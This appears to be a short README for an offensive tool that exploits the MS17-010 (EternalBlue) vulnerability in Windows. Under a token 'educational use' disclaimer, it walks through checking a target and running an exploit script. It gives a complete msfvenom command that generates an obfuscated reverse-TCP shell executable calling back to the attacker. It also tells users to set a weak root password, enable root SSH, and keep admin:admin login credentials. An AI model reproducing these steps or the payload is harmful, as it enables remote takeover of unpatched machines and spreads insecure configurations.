# Hack Into Your Heart

**This tool is only use for academic and educational.If someone use this tool causes any loss to others, I will not take any responsibility.**

You must change root password to !ROOTER and open SSH root permissions.

## Usage

Login page default credentials is admin:admin

Download the ms17-010.sh to /root and start SSH service.
If the vulnerable VM has the MS17-010 vulnerabilities, you can run checker.py with python2 to confirm target can be exploit.
When checker.py is successful scan the vulnerable VM pipe, run send_and_execute.py with python2 to exploit the vulnerable VM.

If you no have the shell.exe use the msfvenom to spawn one.
```
msfvenom -p windows/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=<Your Local IP> LPORT=<Listen Port> -f exe -o shell.exe
```

